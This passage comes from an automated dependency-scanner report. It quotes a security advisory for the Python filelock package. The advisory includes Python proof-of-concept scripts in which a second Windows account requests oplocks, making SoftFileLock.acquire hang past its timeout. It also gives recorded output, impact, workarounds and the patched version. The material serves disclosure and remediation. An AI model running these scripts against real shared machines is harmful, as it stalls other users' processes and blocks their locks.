owner_thread.is_alive()}\")\n\u003e     return stalled\n\u003e \n\u003e \n\u003e print(\"[1a] release() against a second account that keeps requesting a Level 1 oplock, natural window\")\n\u003e stalled_native = release_under_oplock_requests(\"natural\", os.path.join(base, \"native.lock\"), 500)\n\u003e \n\u003e print(\"[1b] the same, with the window between the handle close and the unlink widened to 200 ms\")\n\u003e \n\u003e \n\u003e def slow_unlink(path: str, *, dir_fd: int | None = None) -\u003e None:\n\u003e     time.sleep(0.2)\n\u003e     real_unlink(path, dir_fd=dir_fd)\n\u003e \n\u003e \n\u003e os.unlink = slow_unlink\n\u003e stalled_scheduled = release_under_oplock_requests(\"scheduled\", os.path.join(base, \"native-scheduled.lock\"), 20)\n\u003e os.unlink = real_unlink\n\u003e \n\u003e print(\"[2] SoftFileLock.acquire(timeout=1) against a second account's Level 1 oplock on a live marker\")\n\u003e marker = os.path.join(base, \"soft.lock\")\n\u003e holder = SoftFileLock(marker, is_singleton=False)\n\u003e holder.acquire()\n\u003e holder_fd = holder._context.lock_file_fd  # noqa: SLF001\n\u003e os.close(holder_fd)  # the marker stays with a live PID, as after a holder that lost only its handle\n\u003e impersonate_done = threading.Event()\n\u003e granted_soft: list[tuple[int, Overlapped]] = []\n\u003e \n\u003e \n\u003e def take_soft_oplock() -\u003e None:\n\u003e     impersonate()\n\u003e     if (granted := request_level1(marker)) is not None:\n\u003e         granted_soft.append(granted)\n\u003e     impersonate_done.set()\n\u003e     hold.wait()\n\u003e \n\u003e \n\u003e threading.Thread(target=take_soft_oplock, daemon=True).start()\n\u003e impersonate_done.wait(5)\n\u003e print(f\"  oplock granted: {bool(granted_soft)}\")\n\u003e outcome = [\"still running after 25 s\"]\n\u003e \n\u003e \n\u003e def contend() -\u003e None:\n\u003e     started = time.monotonic()\n\u003e     try:\n\u003e         SoftFileLock(marker, is_singleton=False).acquire(timeout=1)\n\u003e         outcome[0] = f\"acquired after {time.monotonic() - started:.2f} s\"\n\u003e     except Timeout:\n\u003e         outcome[0] = f\"Timeout after {time.monotonic() - started:.2f} s\"\n\u003e     except OSError as error:\n\u003e         outcome[0] = f\"{type(error).__name__} after {time.monotonic() - started:.2f} s: {error}\"\n\u003e \n\u003e \n\u003e contender = threading.Thread(target=contend, daemon=True)\n\u003e contender.start()\n\u003e contender.join(25)\n\u003e print(f\"  contender: {outcome[0]}\")\n\u003e soft_stalled = \"still running\" in outcome[0]\n\u003e if granted_soft:\n\u003e     drop(granted_soft[0])\n\u003e     contender.join(10)\n\u003e     print(f\"  after the holder closed: {outcome[0]}\")\n\u003e hold.set()\n\u003e print(\"STALLS\" if stalled_native or stalled_scheduled or soft_stalled else \"BOUNDED\")\n\u003e ```\n\u003e \n\u003e Recorded output of section `[2]`:\n\u003e \n\u003e ```\n\u003e [2] SoftFileLock.acquire(timeout=1) against a second account's Level 1 oplock on a live marker\n\u003e   oplock granted: True\n\u003e   contender: Timeout after 10.02 s\n\u003e   after the holder closed: Timeout after 10.02 s\n\u003e ```\n\u003e \n\u003e **`oplock_semantics_vm.py`**\n\u003e \n\u003e ```python\n\u003e \"\"\"\n\u003e Which path operations wait for an unanswered oplock break on Windows 11 NTFS. Same account, one process.\n\u003e \n\u003e Run on the VM: C:\\\\venvs\\\\rev4F\\\\Scripts\\\\python.exe oplock_semantics_vm.py C:\\\\tmp\\\\rev4F-sem\n\u003e \"\"\"\n\u003e \n\u003e from __future__ import annotations\n\u003e \n\u003e import ctypes\n\u003e import os\n\u003e import sys\n\u003e import threading\n\u003e import time\n\u003e from ctypes import wintypes\n\u003e \n\u003e base = sys.argv[1]\n\u003e os.makedirs(base, exist_ok=True)\n\u003e kernel32 = ctypes.WinDLL(\"kernel32\", use_last_error=True)\n\u003e kernel32.CreateFileW.restype = kernel32.CreateEventW.restype = wintypes.HANDLE\n\u003e kernel32.CreateFileW.argtypes = [\n\u003e     wintypes.LPCWSTR,\n\u003e     wintypes.DWORD,\n\u003e     wintypes.DWORD,\n\u003e     ctypes.c_void_p,\n\u003e     wintypes.DWORD,\n\u003e     wintypes.DWORD,\n\u003e     wintypes.HANDLE,\n\u003e ]\n\u003e \n\u003e \n\u003e class Overlapped(ctypes.Structure):\n\u003e     _fields_ = (\n\u003e         (\"Internal\", ctypes.c_void_p),\n\u003e         (\"InternalHigh\", ctypes.c_void_p),\n\u003e         (\"Offset\", wintypes.DWORD),\n\u003e         (\"OffsetHigh\", wintypes.DWORD),\n\u003e         (\"hEvent\", wintypes.HANDLE),\n\u003e     )\n\u003e \n\u003e \n\u003e kernel32.DeviceIoControl.argtypes = [\n\u003e     wintypes.HANDLE,\n\u003e     wintypes.DWORD,\n\u003e     ctypes.c_void_p,\n\u003e     wintypes.DWORD,\n\u003e     ctypes.c_void_p,\n\u003e     wintypes.DWORD,\n\u003e     ctypes.c_void_p,\n\u003e     ctypes.POINTER(Overlapped),\n\u003e ]\n\u003e kernel32.CloseHandle.argtypes = [wintypes.HANDLE]\n\u003e kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]\n\u003e GENERIC_READ, GENERIC_WRITE = 0x80000000, 0x40000000\n\u003e SHARE_ALL, OPEN_EXISTING, FLAG_OVERLAPPED = 0x7, 3, 0x40000000\n\u003e INVALID_HANDLE = wintypes.HANDLE(-1).value\n\u003e LEVELS = {\"level1\": 0x00090000, \"batch\": 0x00090008}\n\u003e \n\u003e \n\u003e def take(path: str, level: str) -\u003e tuple[int, Overlapped]:\n\u003e     handle = kernel32.CreateFileW(path, GENERIC_READ, SHARE_ALL, None, OPEN_EXISTING, FLAG_OVERLAPPED, None)\n\u003e     overlapped = Overlapped(hEvent=kernel32.CreateEventW(None, True, False, None))\n\u003e     pending = not kernel32.DeviceIoControl(handle, LEVELS[level], None, 0, None, 0, None, ctypes.byref(overlapped))\n\u003e     assert pending and ctypes.get_last_error() == 997, ctypes.get_last_error()\n\u003e     return handle, overlapped\n\u003e \n\u003e \n\u003e def drop(granted: tuple[int, Overlapped]) -\u003e None:\n\u003e     kernel32.CloseHandle(granted[0])\n\u003e     kernel32.WaitForSingleObject(granted[1].hEvent, 5000)\n\u003e     kernel32.CloseHandle(granted[1].hEvent)\n\u003e \n\u003e \n\u003e def timed(label: str, operation) -\u003e None:  # noqa: ANN001\n\u003e     done = threading.Event()\n\u003e     result = [\"still running after 15 s\"]\n\u003e \n\u003e     def run() -\u003e None:\n\u003e         started = time.monotonic()\n\u003e         try:\n\u003e             operation()\n\u003e             result[0] = f\"returned after {(time.monotonic() - started) * 1000:.1f} ms\"\n\u003e         except OSError as error:\n\u003e             result[0] = f\"{type(error).__name__} after {(time.monotonic() - started) * 1000:.1f} ms: {error}\"\n\u003e         done.set()\n\u003e \n\u003e     threading.Thread(target=run, daemon=True).start()\n\u003e     done.wait(15)\n\u003e     print(f\"  {label}: {result[0]}\")\n\u003e     return done\n\u003e \n\u003e \n\u003e def open_read(path: str) -\u003e None:\n\u003e     os.close(os.open(path, os.O_RDONLY | os.O_BINARY))\n\u003e \n\u003e \n\u003e def open_write(path: str) -\u003e None:\n\u003e     os.close(os.open(path, os.O_RDWR | os.O_BINARY))\n\u003e \n\u003e \n\u003e def create_new(path: str) -\u003e None:\n\u003e     os.close(os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL | os.O_BINARY))\n\u003e \n\u003e \n\u003e for level in LEVELS:\n\u003e     for label, operation, consumes in (\n\u003e         (\"os.open O_RDONLY\", open_read, False),\n\u003e         (\"os.open O_RDWR\", open_write, False),\n\u003e         (\"os.open O_CREAT|O_EXCL on the existing file\", create_new, False),\n\u003e         (\"os.utime by path\", lambda p: os.utime(p, None), False),\n\u003e         (\"os.rename\", lambda p: os.rename(p, p + \".moved\"), True),\n\u003e         (\"os.unlink\", os.unlink, True),\n\u003e     ):\n\u003e         path = os.path.join(base, f\"{level}-{label.replace(' ', '_').replace('|', '')}.lock\")\n\u003e         with open(path, \"w\", encoding=\"utf-8\") as handle:\n\u003e             handle.write(\"1\\nhost\\n\")\n\u003e         granted = take(path, level)\n\u003e         print(f\"{level}, {label}\")\n\u003e         done = timed(label, lambda p=path, op=operation: op(p))\n\u003e         drop(granted)\n\u003e         done.wait(5)\n\u003e         print(f\"    after the holder closed: {'done' if done.is_set() else 'still running'}\")\n\u003e ```\n\u003e \n\u003e The review kept this probe's result as a sentence rather than its printed lines: under a same-account Level 1 or batch oplock, `os.open(path, os.O_RDONLY)`, `os.rename` and `os.unlink` were still running after 15 s and returned only once the holder closed its handle; `os.utime` by path and a failed `O_CREAT | O_EXCL` create returned at once.\n\u003e \n\u003e ## Failure sequence\n\u003e \n\u003e ```mermaid\n\u003e sequenceDiagram\n\u003e     participant A as other local account\n\u003e     participant M as soft.lock marker, no handle open\n\u003e     participant L as lock user: SoftFileLock(path).acquire(timeout=1)\n\u003e     participant W as Windows (NTFS)\n\u003e     A-\u003e\u003eW: CreateFileW(soft.lock, GENERIC_READ, share read/write/delete, FILE_FLAG_OVERLAPPED)\n\u003e     A-\u003e\u003eW: DeviceIoControl(FSCTL_REQUEST_OPLOCK_LEVEL_1), granted, break never acknowledged\n\u003e     L-\u003e\u003eW: os.open(soft.lock, O_CREAT|O_EXCL) fails with EEXIST at once\n\u003e     L-\u003e\u003eW: os.lstat(soft.lock) regular file\n\u003e     rect rgb(255, 214, 214)\n\u003e         L-\u003e\u003eW: os.open(soft.lock, O_RDONLY) inside _read_lock_file\n\u003e         Note over L,W: CreateFileW asks A to break the oplock and waits#59; the 1 s deadline, blocking=False and cancel_check are not consulted\n\u003e         W--\u003e\u003eL: handle after 10.02 s (two-account run), or when A closes (same-account probe)\n\u003e     end\n\u003e     L-\u003e\u003eL: _check_give_up: past the deadline, raise Timeout after 10.02 s\n\u003e     Note over A,M: a stale marker takes the same wait in Path.rename and Path.unlink, so it is not broken\n\u003e ```\n\u003e \n\u003e ## Evidence\n\u003e \n\u003e Section `[2]` of `oplock_vm.py` acquired `soft.lock` as the test account, closed the holder's descriptor so the marker stayed with a live process id and no open handle, took a Level 1 oplock through the second account's read handle (`oplock granted: True`), and ran `SoftFileLock(marker, is_singleton=False).acquire(timeout=1)` on a thread. The call returned `Timeout` after 10.02 s, before the holder closed. The review did not establish what ends the wait at 10 s in the two-account runs; section `[1a]` of the same script, with the second account's handle, shows the same 10 s. In the same-account probe (`oplock_semantics_vm.py`) the open returned only when the holder closed, still running at 15 s. The probe also shows that the failed exclusive create and `os.utime` by path return at once, so the wait is in the read and the break, not in the create attempt.\n\u003e \n\u003e ## Impact\n\u003e \n\u003e Each `acquire()` of a soft lock that finds a marker another account holds an oplock on runs past its `timeout`, `blocking=False` and `cancel_check` until the holder answers or closes, 10 s per attempt in the recorded two-account runs. A stale marker under that oplock is not broken, so no process acquires the lock while the holder keeps its handle. With `AsyncSoftFileLock(run_in_executor=False)` the wait is on the event loop thread and stops every task in the process; with the default executor one worker thread waits. The documentation names a soft lock as the option for network filesystems, after verification on the mount, and `FileLock` is a soft lock on builds without `fcntl` and after its `ENOSYS` fallback. Mutual exclusion is not affected and nothing other than the marker is read, written or deleted.\n\u003e \n\u003e ## Workarounds\n\u003e \n\u003e - Keep soft-lock markers in a directory whose ACL grants other accounts no access to new files: a directory inside the user profile, or one with inheritance removed and only the owner, `SYSTEM` and `Administrators` granted (`icacls \u003cdir\u003e /inheritance:r /grant:r \"\u003cowner\u003e:(OI)(CI)F\" \"SYSTEM:(OI)(CI)F\" \"Administrators:(OI)(CI)F\"`). `mode` does not do this on Windows.\n\u003e - Run `AsyncSoftFileLock` with the default executor rather than `run_in_executor=False`, so that only a worker thread waits.\n\u003e - No `timeout`, `blocking` or `cancel_check` value bounds the wait.\n\u003e \n\u003e ## Patched version\n\u003e \n\u003e 4.2.1.\n\u003e \n\u003e Fix: https://github.com/tox-dev/filelock/pull/835\n\u003e \n\u003e ## Credits\n\u003e \n\u003e Found by the maintainers while reviewing the fix for the report Anthropic's OSS Scanner sent on 15 October 2026 (review round 4, finding F4).\n\u003e \n\u003e - 2026-10-15 23:08 UTC: report received (36 findings; this defect is not among them)\n\u003e - 2026-10-16 01:16 UTC: fix PR #835 opened, for the Linux lease finding of GHSA-7hmp-gf99-57hx\n\u003e - 2026-10-16 08:25 UTC: finding identified in the maintainers' review of PR #835\n\u003e - 2026-10-16 22:43 UTC: draft advisory created\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | filelock | 3.32.2 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-567q-5qvw-pf92 | filelock | 4.2.1 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-112907\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
